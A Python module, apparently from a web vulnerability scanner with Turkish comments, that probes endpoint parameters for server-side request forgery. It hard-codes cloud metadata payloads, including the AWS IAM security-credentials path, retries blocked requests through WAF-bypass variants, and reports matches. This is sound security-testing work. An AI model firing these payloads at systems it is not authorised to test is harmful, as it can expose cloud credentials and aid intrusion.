from ..core.base_detector import BaseDetector
from ..payloads.ssrf import SSRF_INDICATORS, SSRF_PARAM_HINTS, gen_ssrf_payloads


class SSRFDetector(BaseDetector):
    """SSRFmap-inspired SSRF tespiti — cloud metadata, blind, WAF-bypass."""

    def __init__(self, session=None, timeout=10, ai_engine=None, mode='fast', custom_payloads=None, stealth=True):
        super().__init__(session, timeout, ai_engine, mode, custom_payloads, stealth)
        all_payloads = list(gen_ssrf_payloads())
        if self.mode == 'fast':
            self.payloads = all_payloads[:15]
        elif self.mode == 'fuzz':
            self.payloads = all_payloads[:200]
        else:
            self.payloads = all_payloads[:60]

    def _param_priority(self, param):
        param_lower = param.lower()
        for hint in SSRF_PARAM_HINTS:
            if hint in param_lower:
                return 0
        return 1

    def _test_cloud_metadata(self, endpoint, param):
        """Cloud metadata endpoint'lerini test et (AWS, GCP, Azure)."""
        cloud_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
        ]
        results = []
        for payload in cloud_payloads:
            try:
                if endpoint.get('method', 'GET') == 'GET':
                    resp, _, url = self._request_get(endpoint, param, payload)
                else:
                    resp, _ = self._request_post(endpoint, param, payload)
                    url = endpoint['url']

                if self._is_waf_blocking(resp):
                    continue

                indicator = self.analyzer.match_any(resp.text, SSRF_INDICATORS)
                if indicator:
                    results.append(self._make_result(
                        'ssrf', url, param, payload, 'high', 'cloud-metadata',
                        hint=f'Cloud metadata göstergesi ({indicator}) — SSRF ile cloud erişimi sağlanabilir. SSRFmap ile manuel doğrulayın',
                        indicator=indicator,
                    ))
                    break
            except Exception:
                continue
        return results

    def test(self, endpoint):
        results = []
        if not endpoint or not endpoint.get('params'):
            return results

        method = endpoint.get('method', 'GET')
        baseline_body = ''
        baseline_len = 0

        try:
            if method == 'GET':
                baseline_resp, _, _ = self._baseline_get(endpoint)
                baseline_body = baseline_resp.text
                baseline_len = len(baseline_body)
        except Exception:
            pass

        sorted_params = sorted(endpoint['params'], key=self._param_priority)
        if self.mode == 'fast':
            max_payloads = 30 if self._param_priority(sorted_params[0]) == 0 else 15
        elif self.mode == 'fuzz':
            max_payloads = 200 if self._param_priority(sorted_params[0]) == 0 else 100
        else:
            max_payloads = 80 if self._param_priority(sorted_params[0]) == 0 else 40

        for param in sorted_params:
            tested = 0
            for payload in self.payloads:
                if tested >= max_payloads:
                    break
                tested += 1
                try:
                    if method == 'GET':
                        resp, elapsed, url = self._request_get(endpoint, param, payload)
                    else:
                        resp, elapsed = self._request_post(endpoint, param, payload)
                        url = endpoint['url']

                    if self._is_waf_blocking(resp):
                        for bp_resp, bp_elapsed, bp_url, bp_payload in self._request_with_bypass(
                            endpoint, param, payload, 'ssrf'
                        ):
                            if not self._is_waf_blocking(bp_resp):
                                indicator = self.analyzer.match_any(bp_resp.text, SSRF_INDICATORS)
                                if indicator:
                                    results.append(self._make_result(
                                        'ssrf', bp_url, param, bp_payload, 'high', 'waf-bypass-content-match',
                                        hint=f'WAF bypass ile içerik göstergesi: {indicator}. SSRFmap ile manuel doğrulayın',
                                        indicator=indicator,
                                    ))
                                    break
                        continue

                    indicator = self.analyzer.match_any(resp.text, SSRF_INDICATORS)
                    content_changed = self.analyzer.significant_diff(baseline_body, resp.text)
                    slow_response = elapsed > 4

                    if indicator and not self.analyzer.match_any(baseline_body, [indicator]):
                        results.append(self._make_result(
                            'ssrf', url, param, payload, 'high', 'content-match',
                            hint=f'İçerik göstergesi: {indicator}. SSRFmap ile manuel doğrulayın',
                            indicator=indicator,
                        ))
                        break

                    if content_changed and resp.status_code in (200, 301, 302, 307, 308):
                        results.append(self._make_result(
                            'ssrf', url, param, payload, 'medium', 'response-diff',
                            hint='Yanıt içeriği değişti — sunucu dış kaynağa istek atmış olabilir. SSRFmap ile test edin',
                        ))
                        break

                    if slow_response and resp.status_code not in (404, 400, 403):
                        results.append(self._make_result(
                            'ssrf', url, param, payload, 'low', 'timing-hint',
                            hint=f'Yavaş yanıt ({elapsed:.1f}s) — blind SSRF olabilir, manuel test edin',
                        ))
                        break

                except Exception:
                    continue

            # Cloud metadata test
            if not results:
                cloud_results = self._test_cloud_metadata(endpoint, param)
                results.extend(cloud_results)

        return results
